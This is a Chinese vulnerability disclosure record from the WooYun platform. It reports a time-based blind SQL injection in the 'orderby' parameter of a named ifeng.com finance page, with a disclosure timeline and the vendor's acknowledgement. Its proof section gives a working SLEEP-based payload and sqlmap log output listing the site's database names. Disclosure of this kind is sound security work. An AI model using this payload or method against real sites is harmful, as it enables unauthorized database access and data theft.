wybug_detail:
漏洞详情 披露状态：   									2016-03-20：	细节已通知厂商并且等待厂商处理中									2016-03-20：	厂商已经确认，细节仅向厂商公开									2016-03-30：	细节向核心白帽子及相关领域专家公开									2016-04-09：	细节向普通白帽子公开									2016-04-19：	细节向实习白帽子公开									2016-05-04：	细节向公众公开  简要描述： ... 详细说明：  http://app.finance.ifeng.com/stock/dxf/day.php?day=20080808&orderby=amount&ordertype=desc   漏洞证明：  
Parameter: orderby (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: day=20080808&orderby=amount AND (SELECT * FROM (SELECT(SLEEP(5)))jSGn)&ordertype=desc---[07:00:08] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[07:00:08] [INFO] fetching database names[07:00:08] [INFO] fetching number of databases[07:00:08] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                        [07:00:17] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[07:00:18] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 10[07:00:35] [INFO] retrieved: information_schema[07:06:52] [INFO] retrieved: custom[07:09:07] [INFO] retrieved: db40[07:10:32] [INFO] retrieved: finance[07:12:43] [INFO] retrieved: finance2[07:15:11] [INFO] retrieved: mysql[07:16:58] [INFO] retrieved: pg[07:17:50] [INFO] retrieved: suggest[07:20:22] [INFO] retrieved: test[07:21:50] [INFO] retrieved: ustockavailable databases [10]:[*] custom[*] db40[*] finance[*] finance2[*] information_schema[*] mysql[*] pg[*] suggest[*] test[*] ustock

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-03-20 10:57 厂商回复： 非常感谢您对凤凰网信息安全的帮助。 最新状态： 暂无
